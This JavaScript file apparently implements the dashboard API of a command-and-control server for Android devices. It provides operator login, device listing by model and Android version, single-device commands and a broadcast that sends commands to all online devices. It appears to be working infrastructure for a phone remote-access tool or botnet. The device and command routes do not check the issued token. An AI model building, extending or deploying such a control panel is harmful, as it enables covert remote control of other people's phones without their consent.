import jwt from 'jsonwebtoken';
import { config } from './config.js';

export function setupDashboardAPI(app, c2) {
  
  // AUTH
  app.post('/api/auth', (req, res) => {
    const { user, pass } = req.body;
    if (user === config.dashboardUser && pass === config.dashboardPass) {
      const token = jwt.sign({ user, time: Date.now() }, config.jwtSecret, { expiresIn: '24h' });
      res.cookie('token', token, { httpOnly: true, maxAge: 86400000, sameSite: 'strict' });
      return res.json({ ok: true, token });
    }
    res.status(401).json({ error: 'Invalid credentials' });
  });

  // DEVICES
  app.get('/api/devices', (req, res) => {
    const devs = c2.getDevices();
    res.json({ 
      devices: devs, 
      online: c2.getOnlineCount(), 
      total: c2.getTotalCount(),
      timestamp: Date.now()
    });
  });

  // DEVICE DETAIL
  app.get('/api/devices/:id', (req, res) => {
    const dev = c2.getDevice(req.params.id);
    if (!dev) return res.status(404).json({ error: 'Not found' });
    res.json(dev);
  });

  // SEND COMMAND
  app.post('/api/command', (req, res) => {
    const { deviceId, type, data, ...extra } = req.body;
    if (!deviceId || !type) return res.status(400).json({ error: 'Missing deviceId or type' });
    const cmd = data !== undefined ? { type, data, ...extra } : { type, ...extra };
    const sent = c2.sendCommand(deviceId, cmd);
    res.json({ ok: sent, command: type });
  });

  // BATCH COMMAND
  app.post('/api/broadcast', (req, res) => {
    const { type, data } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });
    const devs = c2.getOnlineDevices();
    let sent = 0;
    devs.forEach(d => {
      if (c2.sendCommand(d.id, data !== undefined ? { type, data } : { type })) sent++;
    });
    res.json({ ok: true, sent, total: devs.length });
  });

  // STATS
  app.get('/api/stats', (req, res) => {
    const devs = c2.getDevices();
    const models = {};
    const androidVersions = {};
    devs.forEach(d => {
      const m = d.info?.model || 'Unknown';
      models[m] = (models[m]||0) + 1;
      const v = d.info?.android || '?';
      androidVersions[v] = (androidVersions[v]||0) + 1;
    });
    res.json({
      online: c2.getOnlineCount(),
      total: c2.getTotalCount(),
      models,
      androidVersions,
      uptime: process.uptime()
    });
  });
}
